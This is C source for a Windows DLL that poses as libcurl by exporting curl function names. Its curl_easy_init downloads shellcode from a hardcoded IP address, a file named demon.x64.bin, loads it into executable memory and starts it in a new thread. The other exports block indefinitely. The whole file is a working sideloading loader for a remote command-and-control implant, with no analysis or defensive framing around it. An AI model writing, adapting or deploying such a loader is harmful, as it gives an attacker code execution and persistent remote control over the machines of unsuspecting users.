#define _CRT_SECURE_NO_WARNINGS
#include "pch.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "download.h"

void RunShellcode() {
    const char* url_enc = "http://45.150.128.160:8080/demon.x64.bin";
    DownloadResult* enc = download_shellcode(url_enc);
    if (!enc || !enc->data || enc->size == 0) {
        free_download_result(enc);
        return;
    }

    LPVOID mem = VirtualAlloc(NULL, enc->size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        free_download_result(enc);
        return;
    }

    memcpy(mem, enc->data, enc->size);

    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (thread) {
        WaitForSingleObject(thread, INFINITE);
        CloseHandle(thread);
    }

    VirtualFree(mem, 0, MEM_RELEASE);
    free_download_result(enc);
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


void* curl_easy_init() {
    RunShellcode(); 
    Sleep(INFINITE);
    return NULL; 
}

int curl_easy_setopt(void* curl, int option, ...) {
    Sleep(INFINITE);
    return 0; 
}

int curl_easy_perform(void* curl) {
    Sleep(INFINITE);
    return 0; 
}

void curl_easy_cleanup(void* curl) {
    Sleep(INFINITE);
}

int curl_global_init(long flags) {
    Sleep(INFINITE);
    return 0; 
}

void curl_global_cleanup() {
    Sleep(INFINITE);
}